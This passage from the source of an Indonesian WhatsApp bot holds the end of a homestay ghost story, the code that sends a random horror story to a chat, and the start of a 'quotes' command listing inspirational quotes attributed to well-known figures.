Siti.\nSaat muncul suara orang bermain pasir itu, suaminya sempat bangun sebelum kembali tidur. Siti maklum karena suaminya mungkin penat karena lelah mengemudikan mobil.Di saat suara pasir dan kursi diseret terdengar bergantian, tiba-tiba muncul suara kelereng dijatuhkan ke lantai dari tempat tinggi.\n\" Saya langsung meremang. Meski badan letih dan mengantuk tapi mata dan pikiran saya tak bisa diajak tidur karena mendengar bunyi-bunyian misterius itu,\"  imbuh Siti.\nHingga jam 2.30 pagi, Siti tak bisa tidur diganggu bunyi-bunyian di dalam homestay tersebut.\nSiti pun berusaha menenangkan dirinya dengan membaca ayat Kursi sambil terpejam, berharap akhirnya bisa tertidur lelap.\n\" Waktu seakan berjalan sangat lambat, sementara bunyi-bunyian itu terus bermunculan secara bergantian,\"  kata Siti.Namun yang membuat Siti sangat ketakutan adalah bunyi orang menyiram toliet yang ada di kamar mandi dalam.\n\" Saat itu saya benar-benar menggigil ketakutan. Mata tertutup rapat tapi telinga mendengar pintu kamar mandi di dalam terbuka sendiri.\n\" Setelah itu saya mendengar toliet disiram seperti ada orang baru memakainya. Jantung ini berdebar kencang, cerita-cerita horor langsung muncul di pikiran,\"  katanya.\nLama-lama Siti akhirnya tertidur juga walau bunyi-bunyian itu masih terus ada. Itupun tidur-tidur ayam karena Siti terbangun pukul 5 pagi.\nDalam hati dia bersyukur anak-anak bisa tidur dengan nyenyak. Bayangkan kalau mereka juga ikut mendengar apa dialami Siti. Dia tak tahu harus bagaimana mengatasi perasaan takut anak-anaknya.\n\" Saya yakin bunyi-bunyi aneh di malam itu bukan perasaan saya saja, sebab saya tak punya bayangan seram sebelumnya saat memutuskan menginap di rumah itu,\"  kataya.Siti kemudian membangunkan keluarganya untuk sholat Subuh sebelum dia keluar dari kamar. Tidak ada perubahan apa pun dari semalam dia masuk ke kamar.\n\" Semua perabot tetap di tempatnya, tak ada satu pun yang berpindah. Saya kira 'makhluk' itu mau bantu menata perabot yang ada supaya dekorasinya jadi lebih menarik,\"  kata Siti sambil bercanda.\nSaat dalam perjalanan pulang, Siti bercerita tentang pengalaman seramnya kepada suami. Ternyata suaminya juga mendengar gangguan tersebut tapi lebih memilih tidur karena sudah lelah.\nSuami Siti bilang gangguan itu muncul karena makhluk halus di rumah itu mungkin hanya ingin memberitahu bahwa ia ada.\n\" Gurauan manja dari 'si dia' sebagai salam perkenalan. Sebab kawasan itu dulu mungkin hutan atau apa. Kita juga tidak tahu,\"  kata Siti menirukan ucapan sang suami.\nDari kisah horornya itu, Siti tetap bersyukur karena tidak ada hal yang serius atau terlalu menakutkan yang terjadi kepadanya.\nSumber: Siakapkeli.my"
} ]
const ceritahoror = horor[Math.floor(Math.random() * horor.length)]
await juna.sendMessage(m.chat, {
text: `*${ceritahoror.judul}*\n\nDesk:\n${ceritahoror.desc}\n\nStory:\n${ceritahoror.story}`,
contextInfo: {
externalAdReply: {  
title: ceritahoror.judul,
body: 'WhatsApp Bot Cerpen',
thumbnailUrl: ceritahoror.thumb,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'quotes': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const quot = [
    {
      "author": "A. France",
      "quotes": "Lebih baik mengerti sedikit daripada salah mengerti."
    },
    {
      "author": "Abraham Lincoln",
      "quotes": "Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan."
    },
    {
      "author": "Aeschylus",
      "quotes": "Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya."
    },
    {
      "author": "Aesop",
      "quotes": "Penderitaan adalah pelajaran."
    },
    {
      "author": "Albert Einstein",
      "quotes": "Ilmu pengetahuan tanpa agama adalah pincang."
    },
    {
      "author": "Albert Einstein",
      "quotes": "Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak."
    },
    {
      "author": "Albert Einstein",
      "quotes": "Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala."
    },
    {
      "author": "Albert Einstein",
      "quotes": "Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?."
    },
    {
      "author": "Albert Enstein",
      "quotes": "Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri."
    },
    {
      "author": "Alex Osborn",
      "quotes": "Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri."
    },
    {
      "author": "Alexander A. Bogomoletz",
      "quotes": "Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama."
    },
    {
      "author": "Alexander Solzhenitsyn",
      "quotes": "Manusia akan bahagia selama ia memilih untuk bahagia."
    },
    {
      "author": "Ali Javan",
      "quotes": "Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang."
    },
    {
      "author": "Ali bin Abi Thalib",
      "quotes": "Apabila sempurna akal seseorang, maka sedikit perkataannya."
    },
    {
      "author": "Ali bin Abi Thalib",
      "quotes": "Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya."
    },
    {
      "author": "Ali bin Abi Thalib",
      "quotes": "Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang."
    },
    {
      "author": "Anne M. Lindbergh",
      "quotes": "Yang palin melelahkan dalam hidup adalah menjadi orang yang tidak tulus."
    },
    {
      "author": "Anonim",
      "quotes": "Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup."
    },
    {
      "author": "Anonim",
      "quotes": "Penundaan adalah kuburan dimana peluang dikuburkan."
    },
    {
      "author": "Antonie De Saint",
      "quotes": "Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama."
    },
    {
      "author": "Aristoteles",
      "quotes": "Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan."
    },
    {
      "author": "Arnold Glasow",
      "quotes": "Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja."
    },
    {
      "author": "Art Buchwald",
      "quotes": "Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan."
    },
    {
      "author": "Artemus Ward",
      "quotes": "Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi."
    },
    {
      "author": "Ashleigh Brilliant",
      "quotes": "Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan."
    },
    {
      "author": "Augustine",
      "quotes": "Kesabaran adalah teman dari kebijaksanaan."
    },
    {
      "author": "Ayn Rand",
      "quotes": "Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain."
    },
    {
      "author": "B. J. Habibie",
      "quotes": "Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan."
    },
    {
      "author": "Balzac",
      "quotes": "Kebencian seperti halnya cinta, berkobar karena hal-hal kecil."
    },
    {
      "author": "Barbara Sher",
      "quotes": "Anda tidak perlu harus berhasil pada kali pertama."
    },
    {
      "author": "Beecher",
      "quotes": "Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung."
    },
    {
      "author": "Benjamin Disraeli",
      "quotes": "Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri."
    },
    {
      "author": "Bill Clinton",
      "quotes": "Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan."
    },
    {
      "author": "Bill Cosby",
      "quotes": "Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang."
    },
    {
      "author": "Bill Gates",
      "quotes": "Konsumen yang paling tidak puas adalah sumber berharga untuk belajar."
    },
    {
      "author": "Bill Mccartney",
      "quotes": "Kita ada disini bukan untuk saling bersaing. Kita ada disini untuk saling melengkapi."
    },
    {
      "author": "Brian Koslow",
      "quotes": "Semakin kita bersedia bertanggung jawab atas perbuatan-perbuatan kita, semakin banyak kredibilitas yang kita miliki."
    },
    {
      "author": "Browning",
      "quotes": "Selalu baik untuk memaafkan, tapi yang paling baik adalah melupakan sebuah kesalahan."
    },
    {
      "author": "Bruce Lee",
      "quotes": "Jangan menjadi pohon kaku yang mudah patah. Jadilah bambu yang mampu bertahan melengkung melawan terpaan angin."
    },
    {
      "author": "Budha Gautama",
      "quotes": "Jangan menangis karena kegagalan cinta, sebab manusia akan meninggalkan semua yang dicintainya."
    },
    {
      "author": "Bunda Teresa",
      "quotes": "Jika Anda mengadili orang lain, Anda tak punya waktu untuk mencintai mereka."
    },
    {
      "author": "Bunda Teresa",
      "quotes": "Jika tidak ada perdamaian, hal itu disebabkan kita telah lupa bahwa kita saling membutuhkan."
    },
    {
      "author": "Bung Hatta",
      "quotes": "Kurang cerdas dapat diperbaiki dengan belajar, kurang cekatan dapat diperbaiki dengan pengalaman, kurang jujur sulit memperbaikinya."
    },
    {
      "author": "Burn",
      "quotes": "Banyak orang sukses berkat banyaknya kesulitan dan kesukaran yang mesti dihadapi."
    },
    {
      "author": "Carol Burnet",
      "quotes": "Hanya aku yang bisa merubah hidupku, tak ada seorang pun yang dapat melakukannya untukku."
    },
    {
      "author": "Charles Darwin",
      "quotes": "Yang bisa bertahan hidup bukan spesies yang paling kuat. Bukan juga spesies yang paling cerdas. Tapi spesies yang paling responsif terhadap perubahan."
    },
    {
      "author": "Charles R. Swindoll",
      "quotes": "Hidup adalah 10 persen yang terjadi kepada Anda, 90 persen bagaimana cara Anda menyikapinya."
    },
    {
      "author": "Ching Hai",
      "quotes": "Memperbaiki diri kita adalah memperbaiki dunia."
    },
    {
      "author": "Ching Hai",
      "quotes": "Jangan membeda-bedakan pekerjaan mana yang baik dan mana yang buruk. Masalah muncul jika kita membeda-bedakan dan memihak sesuatu."
    },
    {
      "author": "Ching Hai",
      "quotes": "Kita bekerja harus tanpa pamrih. Itu berlaku untuk segala pekerjaan. Pengabdian tanpa syarat adalah yang terbaik."
    },
    {
      "author": "Ching Hai",
      "quotes": "Kita harus menemukan kekuatan cinta dalam diri kita terlebih dahulu, barulah kita dapat benar-benar mencintai orang lain."
    },
    {
      "author": "Ching Hai",
      "quotes": "Carilah uang secukupnya saja untuk membiayai kehidupan, agar dapat menyisihkan waktu dan tenaga untuk melatih spiritual."
    },
    {
      "author": "Christopher Colombus",
      "quotes": "Harta benda tak membuat seseorang menjadi kaya raya, mereka hanya membuatnya lebih sibuk."
    },
    {
      "author": "Cicero",
      "quotes": "Hati yang penuh syukur, bukan saja merupakan kebajikan terbesar, melainkan induk dari segala kebajikan yang lain."
    },
    {
      "author": "Cicero",
      "quotes": "Hati yang penuh syukur, bukan saja merupakan kebajikan terbesar, melainkan juga induk dari segala kebajikan yang lain."
    },
    {
      "author": "Clarence Darrow",
      "quotes": "Kebebasan itu berasal dari manusia, tidak dari undang-undang atau institusi."
    },
    {
      "author": "Confucius",
      "quotes": "Hidup ini benar-benar sederhana, tapi kita malah bersikeras membuatnya menjadi rumit."
    },
    {
      "author": "Confucius",
      "quotes": "Kemana pun Anda pergi, pergilah dengan sepenuh hati."
    },
    {
      "author": "Confucius",
      "quotes": "Orang yang melakukan kesalahan dan tidak memperbaiki kesalahannya, melalakukan kesalahan yang lainnya."
    },
    {
      "author": "Confucius",
      "quotes": "Kebanggaan kita yang terbesar bukan karena tidak pernah gagal, tetapi bangkit kembali setiap kita jatuh."
    },
    {
      "author": "Cowper",
      "quotes": "Bunga yang tidak akan pernah layu dibumi adalah kebajikan."
    },
    {
      "author": "Cynthia Ozick",
      "quotes": "Untuk membayangkan hal yang tak dapat dibayangkan, dibutuhkan imajinasi yang luar biasa."
    },
    {
      "author": "D. J. Schwartz",
      "quotes": "Kesulitan apapun tidak tahan terhadap keuletan dan ketekunan. Tanpa keuletan, orang yang paling pintar dan paling berbakat sering gagal dalam hidupnya."
    },
    {
      "author": "Dale Carnegie",
      "quotes": "Satu-satunya cara agar kita memperoleh kasih sayang, adalah jangan menuntut agar kita dicintai, tetapi mulailah memberi kasih sayang kepada orang lain tanpa mengharapkan balasan."
    },
    {
      "author": "Dale Carnegie",
      "quotes": "Bila orang yang kuatir akan kekurangannya mau mensyukuri kekayaan yang mereka miliki, mereka akan berhenti kuatir."
    },
    {
      "author": "Dale Carnegie",
      "quotes": "Usahakan membentuk suatu hubungan \"kawat\" antara otak dan hati Anda."
    },
    {
      "author": "Dale Carnegie",
      "quotes": "Senyuman akan membuat kaya jiwa seseorang yang menerimanya, tanpa membuat miskin seseorang yang memberikannya."
    },
    {
      "author": "Dale Carnegie",
      "quotes": "Orang jarang sukses kecuali jika mereka senang dengan apa yang dikerjakannya."
    },
    {
      "author": "David Livingston",
      "quotes": "Saya akan pergi kemanapun selama itu arahnya ke depan."
    },
    {
      "author": "David V. Ambrose",
      "quotes": "Jika Anda punya kemauan untuk menang, Anda sudah mencapai separuh sukses. Jika Anda tidak punya kemauan untuk menang, Anda sudah mencapai separuh kegagalan."
    },
    {
      "author": "David Weinbaum",
      "quotes": "Rahasia menuju hidup kaya adalah mempunyai lebih banyak awal ketimbang akhir."
    },
    {
      "author": "Desbarolles",
      "quotes": "Kebenaran yang tidak dimengerti akan menjadi kesalahan."
    },
    {
      "author": "Descrates",
      "quotes": "Saya berpikir, karena itu saya ada."
    },
    {
      "author": "Djamaludin Abassy",
      "quotes": "Mental yang lemah lebih parah dari fisik yang lemah."
    },
    {
      "author": "Donald Kendall",
      "quotes": "Satu-satunya sukses yang diraih sebelum bekerja hanyalah ada di kamus saja."
    },
    {
      "author": "Dr. Frank Crane",
      "quotes": "Sahabat terbaik dan musuh terburuk kita adalah pikiran-pikiran kita. Pikiran dapat lebih baik dari seorang dokter atau seorang bankir atau seorang teman kepercayaan. Juga dapat lebih berbahaya dadi penjahat."
    },
    {
      "author": "Dr. Ronald Niednagel",
      "quotes": "Pergilah sejauh Anda bisa memandang, dan ketika Anda tiba disana, Anda akan memandang lebih jauh."
    },
    {
      "author": "Dr.\u00a0Johnnetta Cole",
      "quotes": "Jika kamu ingin pergi cepat, pergilah sendiri. Jika kamu ingin pergi jauh, pergilah bersama-sama."
    },
    {
      "author": "Dwigt D. Esenhower",
      "quotes": "Seorang intelektual tidak akan pernah mengatakan lebih daripada apa yang diketahuinya."
    },
    {
      "author": "Earl Campbell",
      "quotes": "Persoalan-persoalan adalah harga yang Anda bayar untuk kemajuan."
    },
    {
      "author": "Earl Campbell",
      "quotes": "Persoalan-persoalan adalah harga yang harus Anda bayar untuk kemajuan."
    },
    {
      "author": "Edgar Alnsel",
      "quotes": "Hidup manusia penuh dengan bahaya, tetapi disitulah letak daya tariknya."
    },
    {
      "author": "Edmund Burke",
      "quotes": "Anda tidak dapat merencanakan masa yang akan datang berdasarkan masa lalu."
    },
    {
      "author": "Edward L. Curtis",
      "quotes": "Optimisme yang tidak disertai dengan usaha hanya merupakan pemikiran semata yang tidak menghasilkan buah."
    },
    {
      "author": "Edward de Bono",
      "quotes": "Jika Anda termasuk orang yang senang menunggu datangnya peluang, Anda adalah bagian dari manusia pada umumnya."
    },
    {
      "author": "Edy Murphy",
      "quotes": "Aku menghabiskan usia 30-an untuk memperbaiki segala kesalahanku di usia 20-an."
    },
    {
      "author": "Einstein",
      "quotes": "Berusaha untuk tidak menjadi manusia yang berhasil tapi berusahalah menjadi manusia yang berguna."
    },
    {
      "author": "Eisenhower",
      "quotes": "Mulai sekarang kita tidak usah membuang-buang waktu barang semenit pun untuk memikirkan orang-orang yang tidak kita sukai."
    },
    {
      "author": "Elanor Roosevelt",
      "quotes": "Ketika kita berhenti membuat kontribusi, kita mulai mati."
    },
    {
      "author": "Elbert Hubbad",
      "quotes": "Kesalahan terbesar yang dibuat manusia dalam kehidupannya adalah terus-menerus merasa takut bahwa mereka akan melakukan kesalahan."
    },
    {
      "author": "Elizabeth Browning",
      "quotes": "Janganlah menyebut orang tidak bahagia sebelum dia mati. Jangan menilai pekerjaan seseorang sebelum pekerjaannya berakhir."
    },
    {
      "author": "Emerson",
      "quotes": "Percaya pada diri sendiri adalah rahasia utama mencapai sukses."
    },
    {
      "author": "Engelbert Huperdinck",
      "quotes": "Anda harus waspada dengan kesenangan. Pastikan bahwa Anda menikmatinya dan bukan dikendalikannya."
    },
    {
      "author": "Erich Watson",
      "quotes": "Kehilangan kekayaan masih dapat dicari kembali, kehilangan kepercayaan sulit didapatkan kembali."
    },
    {
      "author": "Francois De La Roche",
      "quotes": "Bila tidak mampu menemukan kedamaian dalam diri sendiri, tak ada gunanya mencari di tempat lain."
    },
    {
      "author": "Francois De La Roche",
      "quotes": "Kita terbiasa menyembunyikan diri dari orang lain, sampai akhirnya kita sendiri tersembunyi dari diri kita."
    },
    {
      "author": "Francois Roche",
      "quotes": "Kita lebih sibuk menyakinkan orang lain bahwa kita bahagia ketimbang benar-benar merasakan bahagia itu sendiri."
    },
    {
      "author": "Frank Crane",
      "quotes": "Anda mungkin ditipu jika terlalu mempercayai, tetapi hidup Anda akan tersiksa jika tidak cukup mempercayai."
    },
    {
      "author": "Frank Giblin",
      "quotes": "Jadilah diri Anda sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri Anda sendiri?."
    },
    {
      "author": "Franklin",
      "quotes": "Bila Anda ingin dicintai, cintailah dan bersikaplah sebagai orang yang patut dicintai."
    },
    {
      "author": "Fuller",
      "quotes": "Contoh yang baik adalah nasihat terbaik."
    },
    {
      "author": "Galileo Galilei",
      "quotes": "Rumput yang paling kuat tumbuhnya terdapat di atas tanah yang paling keras."
    },
    {
      "author": "Galileo Galilei",
      "quotes": "Kamu tidak dapat mengajari seseorang apa pun, kamu hanya bisa membantunyanya menemukan apa yang ada dalam dirinya sendiri."
    },
    {
      "author": "Gandhi",
      "quotes": "Mereka yang berjiwa lemah tak akan mampu memberi seuntai maaf tulus. Pemaaf sejati hanya melekat bagi mereka yang berjiwa tangguh."
    },
    {
      "author": "Gandhi",
      "quotes": "Kebahagiaan tergantung pada apa yang dapat Anda berikan, bukan pada apa yang Anda peroleh."
    },
    {
      "author": "Gen Collin Powel",
      "quotes": "Tak ada rahasia untuk menggapai sukses. Sukses itu dapat terjadi karena persiapan, kerja keras dan mau belajar dari kegagalan."
    },
    {
      "author": "George B. Shaw",
      "quotes": "Hidup bukanlah tentang menemukan dirimu sendiri. Hidup adalah tentang menciptakan dirimu sendiri."
    },
    {
      "author": "George III",
      "quotes": "Saya lebih baik kehilangan mahkota daripada melakukan tindakan yang menurut saya memalukan."
    },
    {
      "author": "George Santayana",
      "quotes": "Tidak ada obat untuk kelahiran dan kematian, kecuali menikmati yang ada di antara keduanya."
    },
    {
      "author": "George W.",
      "quotes": "Harapan tak pernah meninggalkan kita, kita yang meninggalkan harapan."
    },
    {
      "author": "Gilbert Chesterton",
      "quotes": "Agar bisa menjadi cukup cerdas untuk meraih semua uang yang diinginkan, kita harus cukup bodoh untuk menginginkannya."
    },
    {
      "author": "Gothe",
      "quotes": "Semua pengetahuan yang kumiliki bisa orang lain peroleh, tapi hatiku hanyalah untuk diriku sendiri."
    },
    {
      "author": "H. N. Spieghel",
      "quotes": "Betapapun tingginya burung terbang, toh dia harus mencari dan mendapatkan makanannya di bumi juga."
    },
    {
      "author": "H.L Hunt",
      "quotes": "Tetapkan apa yang Anda inginkan. Putuskan Anda ingin menukarnya dengan apa. Tentukan prioritas dan laksanakan."
    },
    {
      "author": "Hal Borland",
      "quotes": "Melihat pohon, saya jadi mengerti tentang kesabaran. Memandang rumput, saya jadi menghargai ketekunan."
    },
    {
      "author": "Hamka",
      "quotes": "Kecantikan yang abadi terletak pada keelokan adab dan ketinggian ilmu seseorang, bukan terletak pada wajah dan pakaiannya."
    },
    {
      "author": "Hamka",
      "quotes": "Kita harus yakin bahwa apa yang ditentukan oleh Tuhan untuk kita, itulah yang terbaik."
    },
    {
      "author": "Hamka",
      "quotes": "Berani menegakkan keadilan, walaupun mengenai diri sendiri, adalah puncak segala keberanian."
    },
    {
      "author": "Hamka",
      "quotes": "Hawa nafsu membawa kesesatan dan tidak berpedoman. Sementara akal menjadi pedoman menuju keutamaan. Hawa nafsu menyuruhmu berangan-angan, tetapi akal menyuruhmu menimbang."
    },
    {
      "author": "Harriet Braiker",
      "quotes": "Berusaha berhasil untuk memotivasi dirimu, tapi berusaha untuk selalu sempurna akan membuat tertekan."
    },
    {
      "author": "Helen Keller",
      "quotes": "Kita tidak akan belajar berani dan sabar jika di dunia ini hanya ada kegembiraan."
    },
    {
      "author": "Henri Ford",
      "quotes": "Kegagalan hanyalah kesempatan untuk memulai lagi dengan lebih pandai."
    },
    {
      "author": "Henry David Thoreau",
      "quotes": "Kebaikan adalah satu-satunya investasi yang tidak akan merugikan."
    },
    {
      "author": "Henry Ford",
      "quotes": "Idealis adalah orang yang membantu orang lain untuk makmur."
    },
    {
      "author": "Henry Ford",
      "quotes": "Berpikir itu adalah pekerjaan yang berat di antara segala jenis pekerjaan. Itulah sebabnya sedikit sekali orang yang senang melakukannya."
    },
    {
      "author": "Henry Ford",
      "quotes": "Persaingan yang tujuannya hanya untuk bersaing, untuk mengalahkan orang lain, tak pernah mendatangkan banyak manfaat."
    },
    {
      "author": "Henry Longfellow",
      "quotes": "Kehidupan orang-orang besar mengingatkan kita bahwa kita bisa membuat kehidupan kita luhur."
    },
    {
      "author": "Henry Thoreau",
      "quotes": "Hidupku menjadi hiburanku dan tak hentinya memberikan kejutan. Hidupku bagaikan drama dengan begitu banyak babak tanpa adegan penutup."
    },
    {
      "author": "Hubert Humprey",
      "quotes": "Apa yang Anda lihat adalah apa yang Anda capai."
    },
    {
      "author": "Imam Al-Ghazali",
      "quotes": "Kebahagiaan terletak pada kemenangan memerangi hawa nafsu dan menahan keinginan yang berlebih-lebihan."
    },
    {
      "author": "Imam Ghazali",
      "quotes": "Caci maki dari seorang penjahat merupakan kehormatan bagi seorang yang jujur."
    },
    {
      "author": "J.C.F von Schiller",
      "quotes": "Orang yang terlalu banyak merenung akan meraih sedikit."
    },
    {
      "author": "Jack Hyles",
      "quotes": "Jangan gunakan orang-orang untuk membangun pekerjaan besar, gunakan pekerjaan Anda untuk membangun orang-orang besar."
    },
    {
      "author": "Jackson Brown",
      "quotes": "Kesalahaan terbesar yang mungkin Anda buat adalah mempercayai bahwa Anda bekerja untuk orang lain."
    },
    {
      "author": "Jacques Audiberti",
      "quotes": "Kepengecutan yang paling besar adalah ketika kita membuktikan kekuatan kita kepada kelemanan orang lain."
    },
    {
      "author": "James Thurber",
      "quotes": "Jangan lihat masa lalu dengan penyesalan, jangan pula lihat masa depan dengan ketakutan, tapi lihatlah sekitar Anda dengan penuh kesadaran."
    },
    {
      "author": "Janet Erskine",
      "quotes": "Jangan menunggu keadaan yang ideal. Jangan juga menunggu peluang-peluang terbaik. Keduanya tak akan pernah datang."
    },
    {
      "author": "Jeff Goins",
      "quotes": "Kebanyakan orang sukses yang saya kenal bukan orang yang sibuk, mereka orang yang focus."
    },
    {
      "author": "Jerry West",
      "quotes": "Anda tidak dapat melakukan banyak hal di hidup Anda, jika Anda hanya bekerja di hari-hari yang Anda rasakan baik."
    },
    {
      "author": "Jim Rohn",
      "quotes": "Tembok yang kita bangun untuk menghambat kesedihan, juga membuat kita tertutup dari kebahagiaan."
    },
    {
      "author": "Jim Rohn",
      "quotes": "Jika Anda tidak merancang hidup Anda sendiri, kemungkinan Anda akan menjalani rencana orang lain. Apa yang mereka rencanakan untuk Anda? Tidak banyak."
    },
    {
      "author": "Jim Ryan",
      "quotes": "Motivasi adalah sesuatu yang membuat Anda memulai. Kebiasaan adalah sesuatu yang membuat Anda melanjutkan."
    },
    {
      "author": "Jimi Hendrix",
      "quotes": "Ketika kekuatan akan cinta melebihi kecintaan akan kekuasaan, maka dunia pun menemukan kedamaian."
    },
    {
      "author": "Jimmy Dean",
      "quotes": "Aku tak bisa merubah arah angin, tapi aku bisa menyesuaikan layarku untuk tetap bisa mencapai tujuanku."
    },
    {
      "author": "Joan Baez",
      "quotes": "Kita tak bisa memilih bagaimana kita meninggal atau kapan. Kita hanya bisa memutuskan bagaimana kita hidup. Sekarang."
    },
    {
      "author": "John B. Gough",
      "quotes": "Jika Anda ingin sukses, Anda harus menciptakan peluang untuk diri sendiri."
    },
    {
      "author": "John C. Maxwell",
      "quotes": "Bekerja keras sekarang, merasakan hasilnya nanti; bermalas-malasan sekarang, merasakan akibatnya nanti."
    },
    {
      "author": "John C. Maxwell",
      "quotes": "Untuk menangani diri Anda sendiri, gunakan kepala Anda. Untuk menangani orang lain, gunakan hati Anda."
    },
    {
      "author": "John C. Maxwell",
      "quotes": "Bekerja keras sekarang, merasakannya nanti. Bermalas-malas sekarang, merasakan akibatnya nanti."
    },
    {
      "author": "John Craig",
      "quotes": "Tidak peduli seberapa banyak yang dapat Anda lakukan, tidak peduli seberapa menarik hati kepribadian Anda, Anda tidak dapat melangkah jauh jika Anda tidak dapat bekerja bersama orang lain."
    },
    {
      "author": "John D. Rockefeller",
      "quotes": "Orang termiskin adalah orang yang tidak mempunyai apa-apa kecuali uang."
    },
    {
      "author": "John Gardne",
      "quotes": "Jika kita melayani, maka hidup akan lebih berarti."
    },
    {
      "author": "John Gray",
      "quotes": "Sebenarnya semua kesulitan merupakan kesempatan bagi jiwa yang tumbuh."
    },
    {
      "author": "John Manson",
      "quotes": "Anda dilahirkan orisinal, jadi tidak perlu setengah mati meniru orang lain."
    },
    {
      "author": "John Maxwell",
      "quotes": "Seberapa jauh Anda gagal, tidak masalah, tetapi yang penting seberapa sering Anda bangkit kembali."
    },
    {
      "author": "John Q. Adams",
      "quotes": "Jika tindakan-tindakan Anda mengilhami orang lain untuk bermimpi lebih, belajar lebih, bekerja lebih, dan menjadi lebih baik, Anda adalah seorang pemimpin."
    },
    {
      "author": "John Ruskin",
      "quotes": "Saya yakin, ujian pertama bagi orang besar ialah kerendahan hati."
    },
    {
      "author": "John Ruskin",
      "quotes": "Penghargaan tertinggi untuk kerja keras seseorang bukanlah apa yang ia hasilkan, tapi bagaimana ia berkembang karenanya."
    },
    {
      "author": "John Ruskin",
      "quotes": "Penghargaan tertinggi untuk kerja keras seseorang bukanlah apa yang ia hasilkan, tetapi bagaimana ia berkembang karenanya."
    },
    {
      "author": "John Wolfgang",
      "quotes": "Perbuatan-perbuatan salah adalah biasa bagi manusia, tetapi perbuatan pura-pura itulah sebenarnya yang menimbulkan permusuhan dan pengkhianatan."
    },
    {
      "author": "Joseph Addison",
      "quotes": "Rahmat sering datang kepada kita dalam bentuk kesakitan, kehilangan dan kekecewaan; tetapi kalau kita sabar, kita segera akan melihat bentuk aslinya."
    },
    {
      "author": "Julia Roberts",
      "quotes": "Cinta sejati tidak datang kepadamu, tetapi harus datang dari dalam dirimu."
    },
    {
      "author": "Junius",
      "quotes": "Integritas seseorang diukur dengan tingkah lakunya bukan profesinya."
    },
    {
      "author": "Kahlil Gibran",
      "quotes": "Kita berdoa kalau kesusahan dan membutuhkan sesuatu, mestinya kita juga berdoa dalam kegembiraan besar dan saat rezeki melimpah."
    },
    {
      "author": "Kahlil Gibran",
      "quotes": "Untuk memahami hati dan pikiran seseorang, jangan lihat apa yang sudah dia capai, tapi lihat apa yang dia cita-citakan."
    },
    {
      "author": "Keri Russel",
      "quotes": "Kadang kala, justru keputusan kecil yang akan mampu merubah hidup kita selamanya."
    },
    {
      "author": "Knute Rockne",
      "quotes": "Apabila perjalanan menjadi sulit, orang ulet akan berjalan terus."
    },
    {
      "author": "Kong Hu Cu",
      "quotes": "Orang yang berbudi tinggi selalu berpedoman pada keadilan dan selalu berusaha menjalankan kewajiban."
    },
    {
      "author": "Konrad Adenauer",
      "quotes": "Kita semua hidup di bawah langit yang sama, tetapi tidak semua orang punya cakrawala yang sama."
    },
    {
      "author": "Kung Fu-Tze",
      "quotes": "Ia yang bijak akan merasa malu, jika kata-katanya lebih baik daripada tindakannya."
    },
    {
      "author": "Lao Tzu",
      "quotes": "Saat sadar bahwa kau tidak kekurangan suatu apa pun, seisi dunia menjadi milikku."
    },
    {
      "author": "Lao Tzu",
      "quotes": "Saat sadar bahwa kau tidak kekurangan suatu apa pun, seisi dunia menjadi milikmu."
    },
    {
      "author": "Les Brown",
      "quotes": "Terima tanggung jawab untuk diri Anda sendiri. Sadari bahwa hanya Anda sendiri, bukan orang lain, yang bisa membuat Anda pergi ke tempat yang Anda inginkan."
    },
    {
      "author": "Louis Gittner",
      "quotes": "Meski yang kita hadapi adalah jalan buntu, namun cinta akan membangun jalan layang di atasnya."
    },
    {
      "author": "Louis Pasteur",
      "quotes": "Tahukah Anda rahasia sukses saya dalam mencapai tujuan? Cuma keuletan, tak lebih dan tak kurang."
    },
    {
      "author": "Mahatma Gandhi",
      "quotes": "Kepuasan terletak pada usaha, bukan pada hasil. Berusaha dengan keras adalah kemenangan yang hakiki."
    },
    {
      "author": "Marcel Ayme",
      "quotes": "Kerendahan hati merupakan ruang tunggu bagi kesempurnaan."
    },
    {
      "author": "Maria Sharapova",
      "quotes": "Saya belajar banyak dari kekalahan. Dan kekalahan-kekalahan itu, membuat saya semakin tabah."
    },
    {
